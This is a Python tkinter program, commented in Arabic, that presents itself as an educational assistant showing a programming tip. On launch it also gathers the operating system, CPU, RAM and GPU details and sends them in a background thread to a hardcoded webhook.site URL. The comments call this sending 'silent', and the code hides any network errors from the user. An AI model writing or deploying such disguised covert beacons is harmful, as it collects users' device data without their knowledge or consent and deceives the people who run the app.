import tkinter as tk
from tkinter import messagebox
import platform
import psutil
import requests
import threading
import subprocess

# 1. دالة لجلب اسم كرت الشاشة الحقيقي من تعريفات نظام ويندوز
def get_gpu_name():
    try:
        command = "wmic path win32_VideoController get name"
        output = subprocess.check_output(command, shell=True).decode('utf-8')
        lines = [line.strip() for line in output.split('\n') if line.strip()]
        if len(lines) > 1:
            return lines[1]  # السطر الثاني يحتوي على اسم الكرت الفعلي بدقة
    except:
        pass
    return "Unknown GPU"

# 2. دالة جمع البيانات التقنية الحقيقية من عتاد الجهاز
def gather_system_info():
    try:
        os_name = platform.system() + " " + platform.release()
        cpu_name = platform.processor()
        ram_gb = round(psutil.virtual_memory().total / (1024**3))
        gpu_name = get_gpu_name()
        return f"OS: {os_name} | CPU: {cpu_name} | RAM: {ram_gb} GB | GPU: {gpu_name}"
    except Exception as e:
        return f"Error: {str(e)}"

# 3. دالة إرسال البيانات بشكل صامت عبر الإنترنت إلى الـ Webhook الخاص بك
def send_to_webhook(info):
    # رابط الـ Webhook الخاص بك الثابت والمستهدف
    webhook_url = "https://webhook.site/66f6b206-74a3-4212-ae30-c8c044773091"
    try:
        requests.get(f"{webhook_url}?specs={requests.utils.quote(info)}", timeout=10)
    except:
        pass  # في حال عدم وجود إنترنت، لا تظهر أي رسالة خطأ للمستخدم

# 4. بناء واجهة التطبيق التعليمي للمستخدم
def create_app():
    root = tk.Tk()
    root.title("تطبيق المساعد التعليمي 📚")
    root.geometry("500x350")
    root.configure(bg="#1e1e24")

    # نصوص المحتوى التعليمي الظاهر للمستخدم
    title_label = tk.Label(root, text="💡 معلومة برمجية تهمك:", font=("Segoe UI", 16, "bold"), fg="#3498db", bg="#1e1e24")
    title_label.pack(pady=15)

    info_text = ("البرمجة هي عملية كتابة تعليمات توجيهية لجهاز الكمبيوتر\n"
                 "لأداء مهام محددة. لغة بايثون التي يعمل بها هذا التطبيق\n"
                 "الآن تعد من أقوى وأسهل اللغات في العالم!")
    content_label = tk.Label(root, text=info_text, font=("Segoe UI", 12), fg="#e1e1e6", bg="#1e1e24", justify="center")
    content_label.pack(pady=10)

    # زر تفاعلي للمستخدم
    def on_click():
        messagebox.showinfo("أحسنت!", "استمر في شغفك لتعلم البرمجة، فالمستقبل لك!")
    
    # تم تصحيح خيارات الـ padding هنا لحل المشكلة القديمة تماماً
    btn = tk.Button(root, text="اضغط هنا للمزيد", font=("Segoe UI", 11, "bold"), bg="#3498db", fg="white", command=on_click, padx=15, pady=8)
    btn.pack(pady=15)

    # جلب بيانات النظام الحقيقية لعرضها في الأسفل
    system_data = gather_system_info()
    
    # سطر رمادي صغير جداً في أسفل التطبيق يعرض البيانات الحقيقية
    footer_label = tk.Label(root, text=f"بيانات النظام المتزامنة: {system_data}", font=("Segoe UI", 8), fg="#555566", bg="#1e1e24", wraplength=480)
    footer_label.pack(side="bottom", pady=10)

    # إرسال البيانات صامتاً عبر خيط منفصل (Threading) لضمان سرعة التطبيق وعدم تجمده
    threading.Thread(target=send_to_webhook, args=(system_data,), daemon=True).start()

    root.mainloop()

if __name__ == "__main__":
    create_app()
